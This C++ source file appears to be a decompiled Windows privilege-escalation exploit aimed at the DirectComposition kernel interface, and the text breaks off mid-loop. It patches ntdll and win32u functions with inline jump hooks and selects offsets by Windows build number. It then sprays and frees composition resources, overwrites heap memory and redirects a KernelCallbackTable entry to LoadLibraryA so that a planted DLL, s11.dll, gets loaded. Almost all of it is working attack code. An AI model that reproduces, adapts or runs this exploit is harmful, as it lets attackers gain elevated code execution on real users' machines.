#define _CRT_SECURE_NO_WARNINGS

#include <iostream>


using namespace std;



#pragma comment(lib,"d3d11.lib")
#pragma comment(lib,"d2d1.lib")
#pragma comment(lib,"dcomp.lib")
#include <Windows.h>
#include <d3d11.h>
#include <d2d1.h>
#include <dcomp.h>
#include <winnt.h>

typedef unsigned __int64 _QWORD;
typedef unsigned __int32 _DWORD;
typedef unsigned __int8 _BYTE;
typedef unsigned __int16 _WORD;
//128 bits variable
typedef struct _OWORD
{
	unsigned __int64 LowPart;
	unsigned __int64 HighPart;
} OWORD, * POWORD;

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PVOID Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ReservedBits0 : 27;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
} PEB, * PPEB;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef struct _TEB
{
    NT_TIB NtTib;
    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;
    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
}TEB, * PTEB;

struct my_struct
{
  __int64 lpAddress;
  __int64 prutina;
  __int64 Xsegment_content;
  __int64 var_C8;
  __int64 var_C0;
  __int64 var_B8;
  __int64 var_B0;
};

typedef NTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwArgStart,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2
    );


DWORD64 global1 = 0;
DWORD64 global2 = 0;
DWORD64 _global2 = 0;
DWORD global3 = 0;
DWORD64 global4 = 0;
DWORD64 global5 = 0;
BYTE global6 = 0;
BYTE global7 = 0;
BYTE global8 = 0;
DWORD64 value = 0x44E6137754EC77FA;
DWORD64 value4 = 0;
DWORD64 value5 = 0;
DWORD64 value6 = 0;
DWORD64 posicion = 0;
DWORD64 version_flag = 0;
DWORD64 lpMem = 0;
__int64 destination = 0;
HANDLE hHeap = 0;   
HMODULE base_ntdll = 0;
HMODULE base_win32u = 0;
char * sym_RtlAllocateHeap_1 = 0;
char * sym_RtlCreateHeap = 0;
char * sym_NtDCompositionCreateChannel = 0;
char * sym_NtDCompositionCommitChannel = 0;
  __int64 _out2; // rbp
  __int64 _out1; // rsi
__int64 pKernelCallbackTable=0;
char pszPath[] = "C:\\Users\\Public\\Documents\\s11.dll\x00";

__int64 (*My_RtlAllocateHeap)(PVOID,ULONG,SIZE_T)=0;
PVOID (*my_RtlCreateHeap)(DWORD,PVOID,SIZE_T,SIZE_T,PVOID,PVOID)=0;
NTSTATUS (*my_NtDCompositionCreateChannel)(PHANDLE, PSIZE_T, PVOID*)=0;
NTSTATUS (*my_NtDCompositionCommitChannel)(HANDLE, LPDWORD,LPBOOL,BOOL,HANDLE,DWORD64,DWORD64,DWORD)=0;
__int64 (*destination_copy)(_QWORD, _QWORD, _QWORD,BOOL,HANDLE,DWORD64,DWORD64,DWORD)=0;
pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;


__int64 heap_base = 0;
__int64 base = 0;
char *global4_;
__int64 hooked_flag = 0;
__int64 hooked_flag2 = 0;
__int64 MappedAddress = 0;
__int32 offset_to_0x120 = 0;
__int64 SectionSize = 0;


__int64 __fastcall escribe(__int64 a1);
__int64 hook(PVOID arg1, ULONG arg2, SIZE_T arg3);
__int64 __fastcall hook2(DWORD a1,PVOID a2,SIZE_T a3,SIZE_T a4,PVOID a5,PVOID a6);
__int64 __fastcall hook3(PHANDLE, PSIZE_T, PVOID*);
void __fastcall hook4(HANDLE a1, LPDWORD a2, LPBOOL a3, BOOL a4, HANDLE a5, DWORD64 a6, DWORD64 a7, DWORD a8);


__int64 __fastcall escribe(__int64 _pvalue7) {

  __int64 pKCBT_mas_0x388; // rax
  HMODULE kernel_base; // rax

  pKCBT_mas_0x388 = pKernelCallbackTable + 904;
  *(_QWORD *)(_pvalue7 + 8) = 2LL;
  *(_QWORD *)_pvalue7 = pKCBT_mas_0x388;
  *(_QWORD *)(_pvalue7 + 32) = 0LL;
  *(_DWORD *)(_pvalue7 + 24) = 72;
  *(_QWORD *)(_pvalue7 + 40) = 88LL;
  *(_QWORD *)(_pvalue7 + 48) = 56LL;
  *(_QWORD *)(_pvalue7 + 56) = 88LL;
  *(_QWORD *)(_pvalue7 + 64) = 12LL;
  *(_DWORD *)(_pvalue7 + 72) = 40;
  *(_DWORD *)(_pvalue7 + 76) = 32;
  kernel_base = LoadLibraryW(L"kernel32.dll");
  //printf("base %p\n", _pvalue7);
  //printf("loadLibraryA %p\n", GetProcAddress(kernel_base, "LoadLibraryA"));
  *(_QWORD *)(_pvalue7 + 80) = (_QWORD)GetProcAddress(kernel_base, "LoadLibraryA");
  strcpy((char *)(_pvalue7 + 88), "C:\\Users\\Public\\Documents\\s11.dll");
  return (unsigned __int8)pszPath;
}


void hooking(char *lpAddress, PVOID prutina, __int64 *pdestination) {


    unsigned char ida_chars[] =
        {
          0x48, 0x89, 0x5C, 0x24, 0x08, 0xFF, 0x25, 0x00, 0x00, 0x00, 
          0x00
        };

    memcpy(global4_, ida_chars, 11);

    *(DWORD64*)(global4_ + 11) = (DWORD64)(lpAddress+5);

    *pdestination = (__int64 )(global4_);

    unsigned char ida_chars2[] =
        {
          0xFF, 0x25, 0x00, 0x00, 0x00, 0x00
        };

    memcpy(global4_+ 0x13, ida_chars2, 6);

    *(DWORD64*)(global4_ + 0x19) = (DWORD64)(prutina);

    _QWORD diff = (global4_ + 0x13) - lpAddress - 5;

    int32_t desplazamiento = static_cast<int32_t>(diff);

   

  DWORD oldProtect;
    VirtualProtect(lpAddress, (size_t) 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    *(char *)lpAddress = 0xe9;
    *(DWORD *)(lpAddress + 1) = (DWORD)(desplazamiento);
    

}

void hooking2(char *lpAddress, PVOID prutina, __int64 *pdestination) {


    global4_ = global4_ + 0x40;

    unsigned char ida_chars[] =
        {
      0x40, 0x53, 0x56, 0x57, 0x41, 0x54, 0xFF, 0x25, 0x00, 0x00, 
      0x00, 0x00
        };

    memcpy(global4_, ida_chars, 12);

    *(DWORD64*)(global4_ + 12) = (DWORD64)(lpAddress+6);

    *pdestination = (__int64)(global4_);

    unsigned char ida_chars2[] =
        {
          0xFF, 0x25, 0x00, 0x00, 0x00, 0x00
        };

    memcpy(global4_+ 0x14, ida_chars2, 6);

    *(DWORD64*)(global4_ + 0x1a) = (DWORD64)(prutina);

    _QWORD diff = (global4_ + 0x14) - lpAddress - 5;

    int32_t desplazamiento = static_cast<int32_t>(diff);

   

  DWORD oldProtect;
    VirtualProtect(lpAddress, (size_t) 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    *(char *)lpAddress = 0xe9;
    *(DWORD *)(lpAddress + 1) = (DWORD)(desplazamiento);
   

}

void hooking3(char *lpAddress, PVOID prutina, __int64 *pdestination) {


    global4_ = global4_ + 0x80;

    unsigned char ida_chars[] =
        {
          0x4C, 0x8B, 0xD1, 0xB8, 0x1C, 0x11, 0x00, 0x00, 0xFF, 0x25, 
          0x00, 0x00, 0x00, 0x00
        };

    memcpy(global4_, ida_chars, 14);

    *(DWORD64*)(global4_ + 14) = (DWORD64)(lpAddress+8);

    *pdestination = (__int64) (global4_);

    unsigned char ida_chars2[] =
        {
          0xFF, 0x25, 0x00, 0x00, 0x00, 0x00
        };

    memcpy(global4_+ 0x16, ida_chars2, 6);

    *(DWORD64*)(global4_ + 0x1c) = (DWORD64)(prutina);

    _QWORD diff = (global4_ + 0x16) - lpAddress - 5;

    int32_t desplazamiento = static_cast<int32_t>(diff);

   

  DWORD oldProtect;
    VirtualProtect(lpAddress, (size_t) 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    *(char *)lpAddress = 0xe9;
    *(DWORD *)(lpAddress + 1) = (DWORD)(desplazamiento);
   

}

void hooking4(char *lpAddress, PVOID prutina, __int64 *pdestination) {


    global4_ = global4_ + 0xc0;

    unsigned char ida_chars[] =
        {
          0x4C, 0x8B, 0xD1, 0xB8, 0x17, 0x11, 0x00, 0x00, 0xFF, 0x25, 
          0x00, 0x00, 0x00, 0x00
        };

    memcpy(global4_, ida_chars, 14);

    *(DWORD64*)(global4_ + 14) = (DWORD64)(lpAddress+8);

    *pdestination = (__int64) (global4_);

    unsigned char ida_chars2[] =
        {
          0xFF, 0x25, 0x00, 0x00, 0x00, 0x00
        };

    memcpy(global4_+ 0x16, ida_chars2, 6);

    *(DWORD64*)(global4_ + 0x1c) = (DWORD64)(prutina);

    _QWORD diff = (global4_ + 0x16) - lpAddress - 5;

    int32_t desplazamiento = static_cast<int32_t>(diff);

   

  DWORD oldProtect;
    VirtualProtect(lpAddress, (size_t) 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    *(char *)lpAddress = 0xe9;
    *(DWORD *)(lpAddress + 1) = (DWORD)(desplazamiento);
   

}

__int64 hook(PVOID arg1,ULONG arg2,SIZE_T arg3){
  
    __int64 result; // rax

  result = My_RtlAllocateHeap(arg1,arg2,arg3);
  
  if ( heap_base == (__int64)arg1 )
     base = result;
  
  return result;

}

__int64 __fastcall hook2(DWORD a1,PVOID a2,SIZE_T a3,SIZE_T a4,PVOID a5,PVOID a6)
{
  __int64 result; // rax

  if ( !a2 )
    return (__int64) my_RtlCreateHeap(a1, (PVOID) 0LL,a3,a4,a5,a6);

  result = (__int64) my_RtlCreateHeap(a1, a2, a3,a4,a5,a6);
  heap_base = result;
  return result;
}

__int64 __fastcall hook3(PHANDLE a1, PSIZE_T a2, PVOID* a3)
{
  __int64 result; // rax

  if ( hooked_flag )
    return my_NtDCompositionCreateChannel(a1,a2,a3);

  hooked_flag = 1;
  result = my_NtDCompositionCreateChannel(a1,a2,a3);
  MappedAddress = * (__int64 *)a3;
  //printf("MappedAddress %p\n", MappedAddress);
  return result;
}

void __fastcall hook4(HANDLE ArgChannelHandle, LPDWORD out1,LPBOOL out2,BOOL in1,HANDLE in2,DWORD64 a6,DWORD64 a7,DWORD a8)
{

  unsigned int _in1; // r14d

  __int64 _ArgChannelHandle=0; // rdi
  int _offset_to_0x120; // edx
  __int64 index0; // rax
  __int64 p_size_base=0; // r8
  int size_expanded; // r9d
  __int64 units; // rdx
  __int64 p_base_mas_0xbc_mas_0x90; // rcx
  signed int calculated; // eax
  __int64 calculated1; // rcx
  _DWORD *p_size_base_mas_0x38; // r8
  __int64 MappedAddress_; // rax
  __int64 v19; // rax
  __int64 v20; // rax
  __int64 v21; // rax
  DWORD dwArg1=0; // [rsp+40h] [rbp-48h] BYREF
  DWORD dwArg2=0; // [rsp+44h] [rbp-44h] BYREF

  _in1 = in1;
  _out2 = (__int64) out2;
  _out1 = (__int64)out1;
  _ArgChannelHandle = (__int64) ArgChannelHandle;
  if ( hooked_flag2 ) ///dword_7FF6DD9E05F4
  {
    if ( version_flag == 2 )
    {
 LABEL_3:
      destination_copy((__int64)ArgChannelHandle,(__int64) out1,(__int64) out2, in1, in2,a6,a7,a8);
      return;
    }
  }
  else
  {
    _offset_to_0x120 = 0;
    index0 = 0LL;
    while ( *(_DWORD *)(index0 + base) != 288 )//0x120
    {
      _offset_to_0x120 += 4;
      index0 += 4LL;
      if ( index0 >= 256 )
      {
        out1 = (LPDWORD) _out1;
        if ( version_flag != 2 )
          goto LABEL_16;
        destination_copy((__int64)ArgChannelHandle,(__int64) out1,(__int64) out2, in1, in2,a6,a7,a8);
        return;
      }
    }
    p_size_base = _offset_to_0x120 + base;
    offset_to_0x120 = _offset_to_0x120;  
    size_expanded = value4 + 143;
    units = value4 / 0x90u;
    *(_DWORD *)p_size_base = value4 + 143;
    if ( (_DWORD)units )
    {
      p_base_mas_0xbc_mas_0x90 = p_size_base + 188;
      do
      {
        p_base_mas_0xbc_mas_0x90 += 144LL;
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 144) = *(_OWORD *)(p_size_base + 44);
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 128) = *(_OWORD *)(p_size_base + 60);
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 112) = *(_OWORD *)(p_size_base + 76);
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 96) = *(_OWORD *)(p_size_base + 92);
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 80) = *(_OWORD *)(p_size_base + 108);
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 64) = *(_OWORD *)(p_size_base + 124);
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 48) = *(_OWORD *)(p_size_base + 140);
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 32) = *(_OWORD *)(p_size_base + 156);
        *(_OWORD *)(p_base_mas_0xbc_mas_0x90 - 16) = *(_OWORD *)(p_size_base + 172);
        --units;
      }
      while ( units );
    }
    calculated = ((int)((unsigned __int64)(954437177LL * size_expanded) >> 32) >> 5)
        + ((unsigned int)((unsigned __int64)(954437177LL * size_expanded) >> 32) >> 31)
        + 1;
    calculated1 = calculated;
    if ( calculated > 0 )
    {
      p_size_base_mas_0x38 = (_DWORD *)(p_size_base + 56);
      do
      {
        *(p_size_base_mas_0x38 - 3) = 0;
        *p_size_base_mas_0x38 = 0;
        p_size_base_mas_0x38 += 36;
        --calculated1;
      }
      while ( calculated1 );
    }
    MappedAddress_ = MappedAddress;
    *(_QWORD *)(MappedAddress + 4) = 1LL;
    *(_DWORD *)(MappedAddress_ + 8) = 4;
    *(_DWORD *)MappedAddress_ = 8;
    *(_QWORD *)(MappedAddress_ + 16) = 4096LL;
    NtDCompositionProcessChannelBatchBuffer((HANDLE)ArgChannelHandle, 24LL, (PDWORD)&dwArg2, (PDWORD)&dwArg1);
    v19 = MappedAddress;
    *(_DWORD *)MappedAddress = 8;
    *(_QWORD *)(v19 + 4) = 2LL;
    *(_DWORD *)(v19 + 8) = 4;
    *(_QWORD *)(v19 + 16) = 4096LL;
    NtDCompositionProcessChannelBatchBuffer((HANDLE)ArgChannelHandle, 24LL, (PDWORD)&dwArg2,(PDWORD)&dwArg1);
    v20 = MappedAddress;
    *(_DWORD *)MappedAddress = 8;
    *(_QWORD *)(v20 + 4) = 3LL;
    *(_DWORD *)(v20 + 8) = 4;
    *(_QWORD *)(v20 + 16) = 4096LL;
    NtDCompositionProcessChannelBatchBuffer((HANDLE)ArgChannelHandle, 24LL, (PDWORD)&dwArg2, (PDWORD)&dwArg1);
    v21 = MappedAddress;
    *(_DWORD *)MappedAddress = 8;
    *(_QWORD *)(v21 + 4) = 4LL;
    *(_DWORD *)(v21 + 8) = 4;
    *(_QWORD *)(v21 + 16) = 4096LL;
    NtDCompositionProcessChannelBatchBuffer((HANDLE)ArgChannelHandle, 24LL, (PDWORD)&dwArg2,(PDWORD) &dwArg1);
    ++hooked_flag2;
    in1 = _in1;
    out2 = (LPBOOL)_out2;
    out1 = (LPDWORD)_out1;
    ArgChannelHandle = (HANDLE)_ArgChannelHandle;
    if ( version_flag == 2 )
      goto LABEL_3;
  }
LABEL_16:
  my_NtDCompositionCommitChannel(ArgChannelHandle, out1, out2, in1, in2,a6,a7,a8);
}


void init() {

            //After GetVersion detection
            _OSVERSIONINFOW * OSVERSIONINFOW= (_OSVERSIONINFOW *)malloc(0x11CuLL);
              HMODULE ModuleHandleW = GetModuleHandleW(L"ntdll.dll");
              FARPROC RtlGetVersion = GetProcAddress(ModuleHandleW, "RtlGetVersion");

              if (RtlGetVersion == NULL)
              {
				  //printf("RtlGetVersion not found\n");
				  return;
			  }

              ((void (__fastcall *)(_OSVERSIONINFOW *))RtlGetVersion)(OSVERSIONINFOW);

              if (OSVERSIONINFOW == 0)
              {
                  return;
              }

              if (OSVERSIONINFOW->dwMajorVersion != 10 || OSVERSIONINFOW->dwMinorVersion) {
                  //printf("Version not supported0\n");
                  return;
              }
    
              DWORD dwBuildNumber = OSVERSIONINFOW->dwBuildNumber;
              //printf("BuildNumber %x\n", dwBuildNumber);

              if (dwBuildNumber <= 0x4A64)
              {
                    value4 = 0x2d0;
                    value5 = 0x67;
                    value6 = 0x2d0;
                    posicion = 0x2e0;
                    version_flag = 0x2;
			  }

              if (dwBuildNumber == 0x4A65 ||dwBuildNumber == 0x4F7c ||dwBuildNumber == 0x55f0 )
              {
                    value4 = 0x1B0;
                    value5 = 0x4e;
                    value6 = 0x1b0;
                    posicion = 0x1b0;
                    version_flag = 0x2;
			  }

              if (dwBuildNumber == 0x585d ||dwBuildNumber == 0x5867 )
              {
                    value4 = 0x1B0;
                    value5 = 0x50;
                    value6 = 0x1b0;
                    posicion = 0x1b0;
                    version_flag = 0x2;
			  }
              else {
                //printf("Version not supported2\n");
				return;
              }



            base_win32u = LoadLibrary(L"win32u.dll");

            if (base_win32u == NULL)
				return;

            hHeap = HeapCreate(0, 0LL, 0LL);

            NtDCompositionProcessChannelBatchBuffer = (pNtDCompositionProcessChannelBatchBuffer)GetProcAddress(base_win32u, "NtDCompositionProcessChannelBatchBuffer");

            

            //value4 = 0x1B0;
            //value5 = 0x50;
            //value6 = 0x1b0;
            //posicion = 0x1b0;
            //version_flag = 0x2;

            //GetPEB
            PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
            pKernelCallbackTable= (__int64) peb->KernelCallbackTable;

			//Get Ntdll base
            base_ntdll = GetModuleHandleW(L"ntdll.dll");

            global4_ = (char *)VirtualAlloc((LPVOID)(base_ntdll-0x2000), 0x1000uLL, 0x3000u, 0x40u);

            if ( base_ntdll )
              {
                sym_RtlAllocateHeap_1 = (char *)GetProcAddress(base_ntdll, "RtlAllocateHeap");
                if ( sym_RtlAllocateHeap_1 )
                  hooking(sym_RtlAllocateHeap_1, (PVOID) &hook, (__int64*)&My_RtlAllocateHeap);          

                sym_RtlCreateHeap = (char *)GetProcAddress(base_ntdll, "RtlCreateHeap");
                if ( sym_RtlCreateHeap )
				  hooking2(sym_RtlCreateHeap, &hook2, (__int64 *)&my_RtlCreateHeap);
                  

              }


           if (base_win32u)
            {

                sym_NtDCompositionCreateChannel = (char *)(GetProcAddress(base_win32u, "NtDCompositionCreateChannel"));
				if ( sym_NtDCompositionCreateChannel )
				  hooking3(sym_NtDCompositionCreateChannel, &hook3,(__int64 *) &my_NtDCompositionCreateChannel);
                  
                sym_NtDCompositionCommitChannel = (char *)(GetProcAddress(base_win32u, "NtDCompositionCommitChannel"));
                if ( sym_NtDCompositionCommitChannel )
                    hooking4(sym_NtDCompositionCommitChannel, &hook4,(__int64 *) &my_NtDCompositionCommitChannel);
                    
            }

           for (int x = 0; x < 2; x++) {
			   HeapAlloc(hHeap, 0, 0x200uLL);
		   }
            


            if ( version_flag == 2 )
                  destination_copy=(__int64 (*)(_QWORD, _QWORD, _QWORD,BOOL,HANDLE,DWORD64,DWORD64,DWORD))my_NtDCompositionCommitChannel;


}

int main()
{

        __int64 result = 0;
        ID3D11DeviceContext* d3dContext1;
        ID3D11DeviceContext* d3dContext2;
        int v0 = 0;
        DWORD64 _global1 = 0;;
        RECT* p_Rect = 0;
        __int64 pMappedAddress = 0;

        HWND window; 
        ShowWindow(GetConsoleWindow(), SW_HIDE); 

        init();


        // Registrar la clase de ventana
        HICON hicon = { 0 };
        WNDCLASSEXW wcex = {};
        wcex.cbSize = sizeof(WNDCLASSEXW);
        wcex.lpfnWndProc = DefWindowProc;
        wcex.hInstance = GetModuleHandle(nullptr);
        wcex.lpszClassName = L"tgui";
        wcex.style = 3;
        wcex.hIconSm = hicon;
        wcex.hbrBackground = 0;
        wcex.cbClsExtra = 0;
        RegisterClassExW(&wcex);

        // Inicializar COM (si es necesario)
        CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

        // Ajustar el tamaño de la ventana

        RECT rect = { 0, 0, 0x1F4, 0x1F4 };
        RECT rect2 = { 0, 0, 0x1F4, 0x1F4 };

        AdjustWindowRect(&rect, WS_OVERLAPPEDWINDOW, FALSE);


        // Crear la ventana
        HWND hwnd = CreateWindowExW(
            0,
            L"tgui",
            L"Mi Ventana",
            WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
            CW_USEDEFAULT, CW_USEDEFAULT, rect.right - rect.left, rect.bottom - rect.top,
            nullptr, nullptr, GetModuleHandle(nullptr), nullptr);

        if (hwnd)
        {
            rect.left = 1;
            rect.top = 5;
            p_Rect = &rect;

            ID3D11Device* d3dDevice = 0;
            ID3D11Device* d3dDevice1 = 0;
            ID3D11DeviceContext* d3dContext = 0;
            D3D_FEATURE_LEVEL featureLevel;

            while (1) {

                if (D3D11CreateDevice(
                    nullptr, // Adapter (nullptr is default)
                    (D3D_DRIVER_TYPE)p_Rect->left, // Controller Type (D3D_DRIVER_TYPE_HARDWARE, D3D_DRIVER_TYPE_WARP, D3D_DRIVER_TYPE_REFERENCE, D3D_DRIVER_TYPE_SOFTWARE, D3D_DRIVER_TYPE_NULL)   
                    nullptr, 
                    0x20, // Flags 
                    nullptr, 0, 
                    D3D11_SDK_VERSION,
                    &d3dDevice,
                    &featureLevel, 
                    &d3dContext
                ) >= 0)
                    break;

                if (d3dContext)
                    d3dContext->Release();
                if (d3dDevice)
                    d3dDevice->Release();
                ++v0;
                p_Rect = (struct tagRECT*)((char*)p_Rect + 4);
                if (v0 >= 2)
                    goto LABEL_24;
            }

            d3dDevice1 = d3dDevice;
            d3dDevice = 0;
            _global1 = global1;

            if ((ID3D11Device*)global1 != d3dDevice1) {
                if (d3dDevice1)
                    d3dDevice1->AddRef();
                _global1 = global1;
                global1 = (DWORD64)d3dDevice1;

                if (_global1) {
                    ((ID3D11Device*)_global1)->Release();
                }
            }

            d3dContext1 = d3dContext;
            d3dContext2 = 0;
            d3dContext = 0;

            _global2 = global2;

            if ((ID3D11DeviceContext*)global2 != d3dContext1) {
                if (d3dContext1) {
                    d3dContext1->AddRef();
                    d3dContext2 = d3dContext;
                    _global2 = global2;
                }

                global2 = (__int64)d3dContext1;
                if (_global2)
                {
                    ((ID3D11DeviceContext*)_global2)->Release();
                    d3dContext2 = d3dContext;
                }
                if (d3dContext2)
                    d3dContext2->Release();
            }
            if (d3dDevice)
                d3dDevice->Release();

        LABEL_24:

            // ...


            REFIID riid = { 0x0BB12D362,0x0DAEE,0x4B9A,{0x0AA, 0x1D, 0x14, 0x0BA, 0x40, 0x1C, 0x0FA, 0x1F} };//ID2D1Factory1
            REFIID riid2 = { 0x54EC77FA,0x1377,0x44E6,{0x8C, 0x32, 0x88, 0xFD, 0x5F, 0x44, 0xC8, 0x4C} };//IDXGIDevice
            REFIID riid3 = { 0x0C37EA93A,0xE7AA,0x450D,{ 0xB1, 0x6F, 0x97, 0x46, 0xCB, 0x04, 0x07, 0xF3} };//IDCompositionDevice
            REFIID riid4 = { 0xCAFCB56C,0x6AC3,0x4889,{0xBF, 0x47, 0x9E, 0x23, 0xBB, 0xD2, 0x60, 0xEC} };//IDXGISurface

            ID2D1Factory1* d2dFactory;

            HRESULT hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, riid, nullptr, (void**)&d2dFactory);

            ((ID3D11Device*)global1)->QueryInterface(riid2, (void**)&d3dContext1);//IDXGIDevice

            __int64 value2 = 0;
            __int64 value3 = 0;

            if (d3dContext1 == 0) { 
                cout << "Error Querying Interface" << endl;
                return 0; }

			d2dFactory->CreateDevice((IDXGIDevice*)d3dContext1, (ID2D1Device**)&value2);
            
            if (value2 == 0) { 
                cout << "Error creating device" << endl;
                return 0; }

            //(*(void(__fastcall**)(__int64, __int64, __int64*))(*(__int64*)value2 + 0x20))(value2, 0LL, &value3);


            ((ID2D1Device*)value2)->CreateDeviceContext((D2D1_DEVICE_CONTEXT_OPTIONS)D2D1_DEVICE_CONTEXT_OPTIONS_NONE, (ID2D1DeviceContext**)&value3);

            IDCompositionDevice* dcompDevice;
            IDCompositionTarget* dcompTarget;
            IDCompositionSurface* dsurface;
            IDCompositionSurface* dsurface2;
            IDCompositionVisual* dvisual;
            POINT updateOffset;
            void* pupdateObject;

            hr = DCompositionCreateDevice(
                (IDXGIDevice*)d3dContext1, // Tu dispositivo Direct3D 11
                riid3,
                reinterpret_cast<void**>(&dcompDevice)
            );

            dcompDevice->CreateTargetForHwnd(hwnd, TRUE, &dcompTarget);

            *(__int64*)&rect.left = 0LL;

            dcompDevice->CreateSurface(0x1F4u, 0x1F4u, DXGI_FORMAT_R8G8B8A8_UNORM, DXGI_ALPHA_MODE_IGNORE, &dsurface);

            dsurface->BeginDraw(&rect2, riid4, &pupdateObject, &updateOffset);
            dsurface->EndDraw();

            dcompDevice->CreateVisual(&dvisual);

            dsurface2 = dsurface;
            dsurface = 0;

            dvisual->SetContent(dsurface2);

            dcompTarget->SetRoot(dvisual);

            if (pupdateObject) {

                result = (*(__int64(__fastcall**)(__int64))(*(__int64*)pupdateObject + 0x10LL))((__int64)pupdateObject);//dq offset [thunk]:CLayeredObject<NDXGI::CResource>::CContainedObject::Release`adjustor{64}' (void)
            }

            if (dsurface2)
                dsurface2->Release();

            if (d3dContext1)
                d3dContext1->Release();

            dcompDevice->Commit();

            int contador2 = 0x3000;
            int contador3 = 0x10000;
            SectionSize = 0x4000LL;
            pMappedAddress = 0LL;
            HANDLE hChannel = 0, hChannel2 = 0, hChannel1 = 0, hChannel3 = 0;
            int contador, index, flag, NumberOfBytesWritten;
            __int64 pMappedAddress1 = 0;
            DWORD64 _value5 = 0;
            _OWORD value6 = { 0 };
            _OWORD value7 = { 0 };
            _OWORD* pvalue7 = { 0 };

            if (version_flag == 2 && ((NTSTATUS(*)(PHANDLE, PSIZE_T, PVOID*))sym_NtDCompositionCreateChannel)(&hChannel, (PSIZE_T)&SectionSize, (PVOID*)&pMappedAddress) >= 0)
            {


                if (hChannel == 0)
                {
                    exit(0);
                }
                contador = 0;
                index = 0x10000;
                if (pMappedAddress)
                {
                    do
                    {
                        pMappedAddress1 = pMappedAddress;
                        hChannel2 = hChannel;
                        _value5 = value5;
                        *(_QWORD*)(pMappedAddress + 4) = (contador + 20); //Tracker
                        *(_DWORD*)(pMappedAddress + 8) = _value5;//0x50 CHolographicInteropTextureMarshaler
                        *(_DWORD*)pMappedAddress = 1; //CreateResource
                        *(_QWORD*)(pMappedAddress + 0xC) = 0; //false

                        if (NtDCompositionProcessChannelBatchBuffer(hChannel2, 16LL, (PDWORD)&flag, (PDWORD)&NumberOfBytesWritten) < 0)
                        {
                            //printf("fail cr running the exploit. This should not occur. retry or abandon\n");
                            exit(-1);
                        }
                        ++contador;
                    } while (contador < 0x10000);

                    ((NTSTATUS(*)(HANDLE, LPDWORD, LPBOOL, BOOL, HANDLE, DWORD64, DWORD64, DWORD))sym_NtDCompositionCommitChannel)(hChannel, (LPDWORD)_out1, (LPBOOL)_out2, 0LL, 0LL, 0, 0, 0);
                    Sleep(0xC8u);

                    do
                    {
                        pMappedAddress1 = pMappedAddress;
                        hChannel1 = hChannel;
                        *(_QWORD*)(pMappedAddress + 4) = (contador + 20);////Tracker
                        *(_DWORD*)(pMappedAddress + 8) = 0;
                        *(_DWORD*)pMappedAddress = 3;//ReleaseResource
                        NtDCompositionProcessChannelBatchBuffer(hChannel1, 16LL, (PDWORD)&flag, (PDWORD)&NumberOfBytesWritten);
                        contador2 += 0x20;
                    } while (contador2 < 0x7000);
                    ((NTSTATUS(*)(HANDLE, LPDWORD, LPBOOL, BOOL, HANDLE, DWORD64, DWORD64, DWORD))sym_NtDCompositionCommitChannel)(hChannel, (LPDWORD)_out1, (LPBOOL)_out2, 0LL, 0LL, 0, 0, 0);
                    Sleep(0xC8u);

                    value6.LowPart = 0x4141414141414141;
                    value6.HighPart = 0x4141414141414141;

                    pvalue7 = (OWORD*)(offset_to_0x120 + 44LL + base + posicion); //0x48+ 44+ base+ 0x1b0
                    *pvalue7 = value6;
                    pvalue7[1] = value6;
                    pvalue7[2] = value6;
                    pvalue7[3] = value6;
                    pvalue7[4] = value6;
                    pvalue7[5] = value6;
                    pvalue7[6] = value6;
                    pvalue7[7] = value6;
                    pvalue7[8] = value6;

                    escribe((__int64)pvalue7);

                    //MessageBoxA(hwnd, "Hola Mundo!", "Mensaje", MB_OK);

                }
            }

            Sleep(0xC8u);

            // Mostrar la ventana
            ShowWindow(hwnd, SW_SHOW);
            CloseWindow(hwnd);

            do
            {
                pMappedAddress1 = pMappedAddress;


                hChannel3 = hChannel;

                if (hChannel3 == 0)
                {
                    exit(0);
                }
                *(_QWORD*)(pMappedAddress + 4) = (unsigned int)(contador3 + 20);
                *(_DWORD*)(pMappedAddress + 8) = 0;
